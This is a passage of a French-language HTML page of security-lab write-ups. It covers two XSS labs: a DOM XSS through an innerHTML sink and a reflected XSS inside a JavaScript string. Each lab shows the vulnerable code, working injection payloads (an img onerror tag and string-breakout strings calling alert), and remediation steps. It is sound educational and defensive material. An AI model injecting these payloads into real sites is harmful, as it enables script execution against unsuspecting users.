+<li>Rejeter les pseudo-protocoles <code>javascript:</code> et <code>data:</code>.</li>
+<li>Encoder la sortie même dans les attributs <code>href</code>.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-28-dom-xss-in-innerhtml-sink-using-source-locationsearch">Lab 28 — DOM XSS in innerHTML sink using source location.search<a class="headerlink" href="#lab-28-dom-xss-in-innerhtml-sink-using-source-locationsearch" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS) — DOM-based</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an <code>innerHTML</code> assignment, which changes the HTML contents of a div element, using data from <code>location.search</code>. To solve this lab, perform a cross-site scripting attack that calls the alert function.</p>
+<p><strong>Contexte :</strong></p>
+<p>Le code vulnérable ressemble à :</p>
+<div class="highlight"><pre><span></span><code>document.getElementById('searchMessage').innerHTML = location.search.slice(1);
+</code></pre></div>
+<p><code>innerHTML</code> interprète la valeur comme du HTML, mais <strong>pas</strong> les balises <code>&lt;script&gt;</code> (elles ne sont pas exécutées via <code>innerHTML</code>). Il faut donc utiliser un élément HTML qui déclenche du JavaScript sans <code>&lt;script&gt;</code>, comme une balise <code>&lt;img&gt;</code> avec un handler <code>onerror</code>.</p>
+<p><strong>Résolution :</strong></p>
+<p>Dans le champ de recherche, injecter :</p>
+<div class="highlight"><pre><span></span><code>&lt;img src=1 onerror=alert(1)&gt;
+</code></pre></div>
+<p>Ce qui produit dans le DOM :</p>
+<div class="highlight"><pre><span></span><code>&lt;div id="searchMessage"&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;/div&gt;
+</code></pre></div>
+<p>Le navigateur tente de charger l'image depuis <code>src=1</code> (qui échoue), ce qui déclenche le handler <code>onerror</code> et exécute <code>alert(1)</code> → lab résolu ✅</p>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Ne jamais assigner de données utilisateur à <code>innerHTML</code> — utiliser <code>textContent</code> à la place.</li>
+<li>Encoder les sorties HTML avant injection dans le DOM.</li>
+<li>Mettre en place une <code>Content-Security-Policy</code> qui bloque les handlers inline.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+<h2 id="lab-29-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded">Lab 29 — Reflected XSS into a JavaScript string with angle brackets HTML encoded<a class="headerlink" href="#lab-29-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded" title="Permanent link">&para;</a></h2>
+<p><strong>Catégorie :</strong> Cross-Site Scripting (XSS)</p>
+<p><strong>Difficulté :</strong> Apprentice</p>
+<p>This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are HTML encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.</p>
+<p><strong>Contexte :</strong></p>
+<p>La valeur de recherche est réinjectée à l'intérieur d'une chaîne JavaScript dans un <code>&lt;script&gt;</code> de la page, par exemple :</p>
+<div class="highlight"><pre><span></span><code>&lt;script&gt;
+    var searchTerms = 'VALEUR_RECHERCHE';
+    ...
+&lt;/script&gt;
+</code></pre></div>
+<p>Les <code>&lt;</code> et <code>&gt;</code> sont encodés en <code>&amp;lt;</code>/<code>&amp;gt;</code>, donc impossible d'injecter une nouvelle balise. Mais on est <strong>à l'intérieur d'une chaîne JS</strong> — il suffit de la fermer avec un <code>'</code>, d'injecter du code, et de commenter la suite.</p>
+<p><strong>Résolution :</strong></p>
+<p>Dans le champ de recherche, injecter :</p>
+<div class="highlight"><pre><span></span><code>'-alert(1)-'
+</code></pre></div>
+<p>Ce qui produit dans le script :</p>
+<div class="highlight"><pre><span></span><code>var searchTerms = ''-alert(1)-'';
+</code></pre></div>
+<p>Le parser JS interprète <code>''</code> (chaîne vide), puis <code>-alert(1)-</code> (expression valide qui appelle <code>alert</code>), puis <code>''</code> (chaîne vide) → <code>alert(1)</code> s'exécute → lab résolu ✅</p>
+<p>On peut aussi utiliser :</p>
+<div class="highlight"><pre><span></span><code>';alert(1)//
+</code></pre></div>
+<p>Ce qui donne :</p>
+<div class="highlight"><pre><span></span><code>var searchTerms = '';alert(1)//';
+</code></pre></div>
+<p><strong>Remédiation :</strong></p>
+<ul>
+<li>Encoder les apostrophes (<code>'</code> → <code>\'</code>) dans les chaînes JavaScript.</li>
+<li>Ne jamais injecter de données utilisateur directement dans un bloc <code>&lt;script&gt;</code>.</li>
+<li>Utiliser <code>JSON.stringify()</code> pour passer des valeurs dans le JS côté serveur.</li>
+</ul>
+<p><a href="#sommaire">⬆ Sommaire</a></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Retour en haut de la page
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      CryptoGate - Writeups a but educatif - machines HTB retired uniquement
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/CryptoGate-hub" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://profile.hackthebox.com/profile/01a0b5a2-c536-7155-aea6-dbc22da51097" target="_blank" rel="noopener" title="profile.hackthebox.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.top", "navigation.footer", "search.highlight", "search.suggest", "content.code.copy", "toc.integrate"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
